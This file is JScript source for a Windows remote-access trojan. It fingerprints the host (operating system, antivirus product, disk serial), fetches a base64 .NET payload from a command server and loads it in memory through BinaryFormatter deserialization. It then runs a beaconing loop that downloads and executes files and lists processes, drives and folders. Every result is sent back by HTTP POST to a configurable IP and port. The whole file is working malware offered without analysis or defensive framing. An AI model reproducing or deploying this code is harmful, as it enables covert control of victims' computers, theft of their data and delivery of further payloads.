var ip = "127.0.0.1";
var port = "4562";
function OS(){
	var wbemFlagReturnImmediately = 0x10;
	var wbemFlagForwardOnly = 0x20;
	var objWMIService = GetObject("winmgmts:\\\\.\\root\\CIMV2");
	var colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL",
                                      wbemFlagReturnImmediately | wbemFlagForwardOnly);

	var enumItems = new Enumerator(colItems);
	var objItem = enumItems.item();
	return objItem.Caption;
}
function AV(){
	var wbemFlagReturnImmediately = 0x10;
	var wbemFlagForwardOnly = 0x20;
	var objWMIService = GetObject("winmgmts:\\\\.\\root\\SecurityCenter2");
	var colItems = objWMIService.ExecQuery("Select * from AntivirusProduct", "WQL",
                                      wbemFlagReturnImmediately | wbemFlagForwardOnly);

	var enumItems = new Enumerator(colItems);
	var objItem = enumItems.item();
	return objItem.displayName;
}
function HTTPPost(sRequest,_info) {
	var oHTTP = new ActiveXObject('Microsoft.XMLHTTP');
	oHTTP.open("POST","http://" + ip + ":" + port ,false);
	oHTTP.setRequestHeader("User-Agent", _info);
	oHTTP.send(sRequest);
	return oHTTP.responseText;
}
function setversion() {
	var shell = new ActiveXObject('WScript.Shell');
	ver = 'v4.0.30319';
	try {
		shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
	} catch(e) { 
		ver = 'v2.0.50727';
	}
	shell.Environment('Process')('COMPLUS_Version') = ver;
}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}
function HWID(){
var strComputer = '.';
    var SWBemlocator = new ActiveXObject("WbemScripting.SWbemLocator");
    var wmi = SWBemlocator.ConnectServer(strComputer, "/root/CIMV2");
    var str = '';
    var colItems = wmi.ExecQuery("SELECT * FROM Win32_LogicalDisk Where DeviceID = 'C:'");
    var e = new Enumerator(colItems);
    for(; ! e.atEnd(); e.moveNext()) {
        str = e.item().VolumeSerialNumber.toLowerCase();
    }
	return str;
}
function removeCommand(CommandID) {
	return HTTPPost("[THISISSTRING] rc<>" + CommandID,info.replace(/(?:\r\n|\r|\n)/g,"") + o4.UNIX());
}
function ShowFileInfo(filespec){
   var fso, f, s;
   fso = new ActiveXObject("Scripting.FileSystemObject");
   f = fso.GetFile(filespec);
   s = "Created: " + f.DateCreated;
   return(s);
}
var ii = true;
var serialized_obj = "";
do {
		try {
			serialized_obj = HTTPPost("[THISISSTRING] getPlugin","");
		} catch (e) {}
		if(serialized_obj.length > 0){ii=false;}
		WScript.Sleep(5000);
}while (ii);
try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var aa = d.DynamicInvoke(al.ToArray());
	var o1 = aa.CreateInstance('helper.FileManger');
	var o2 = aa.CreateInstance('helper.ProcessManger');
	var o3 = aa.CreateInstance('helper.Downloader');
	var o4 = aa.CreateInstance('helper.MainCode');
	//WScript.Echo(ShowFileInfo(WScript.ScriptFullName));//o4.InstallDate(WScript.ScriptFullName));
	o4.IsSingleInstance("rakan");
	var info = o4.getFullInfo(HWID(),WScript.ScriptFullName,OS(),AV()) + "--";
	info = info.replace(/(?:\r\n|\r|\n)/g,"");
} catch (e) {}//WScript.Echo(e.message);}

do {
	try{
		var aaa1 = HTTPPost("[THISISSTRING] checkBot",info + o4.UNIX());
		//WScript.Echo(aaa1);
		var aaa = aaa1.split("<<>>")
		switch(aaa[2]) {
			case "dowwwnexec":
				var link_ = aaa[3];
				var name_ = aaa[4];
				var done_ = o3.downloader(link_,name_);
				
				if (done_ == "True") { removeCommand(aaa[1]); }
				break;
			case "processlist":
				var list_ = o2.getAllProcess();
				removeCommand(aaa[1]);
				HTTPPost("[THISISSTRING] processlist<>" + list_,info + o4.UNIX())
				break;
			case "harddrives":
				var drivers_ = o1.getDrivers();
				removeCommand(aaa[1]);
				HTTPPost("[THISISSTRING] harddrives<>" + drivers_,info + o4.UNIX())
				break;
			case "filesandfolders":
				var files_ = o1.getFilesByPath(aaa[3]);
				removeCommand(aaa[1]);
				HTTPPost("[THISISSTRING] filesandfolders<>" + files_,info + o4.UNIX())
				break;
		} 
	} catch (e) {
		//WScript.Echo(e.massge);
	}
	WScript.Sleep(5000);
}while (true)